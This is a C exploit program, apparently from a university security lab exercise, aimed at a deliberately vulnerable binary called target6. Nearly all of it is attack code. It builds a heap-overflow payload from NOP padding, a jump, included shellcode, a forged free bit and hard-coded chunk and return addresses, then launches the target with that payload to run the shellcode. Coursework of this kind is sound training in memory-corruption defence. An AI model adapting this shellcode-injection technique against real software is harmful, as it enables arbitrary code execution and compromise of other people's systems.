#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define p_addr 0x0104ec44
#define q_addr 0x0104ec98

int main(void)
{
    char *args[3];
    char *env[1];

    char attack_string [130];
    int i;
    for (i = 0; i < strlen(shellcode) + 8; i ++){
        if (i < 8){
            attack_string[i] = 0x90;
        }
        attack_string[i + 8] = shellcode[i];
    }
    attack_string[0] = 0xeb;
    attack_string[1] = 0x25;
    attack_string[4] = 0x91; //set the freebit to 1

    for (; i < (q_addr - p_addr - 4); i ++){
        attack_string [i] = 0x90;
    }

    attack_string[72] = 0x48;
    attack_string[73] = 0xec;
    attack_string[74] = 0x04;
    attack_string[75] = 0x01;

    attack_string[76] = 0x98;
    attack_string[77] = 0xec;
    attack_string[78] = 0x04;
    attack_string[79] = 0x01; 

    attack_string[80] = 0x90;
    attack_string[81] = 0x90;
    attack_string[82] = 0x90;
    attack_string[83] = 0x90;

    attack_string[84] = 0xa9;
    attack_string[85] = 0xfe;
    attack_string[86] = 0xa4;
    attack_string[87] = 0x40;



    args[0] = TARGET; 
    args[1] = attack_string; 
    args[2] = NULL;
    
    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
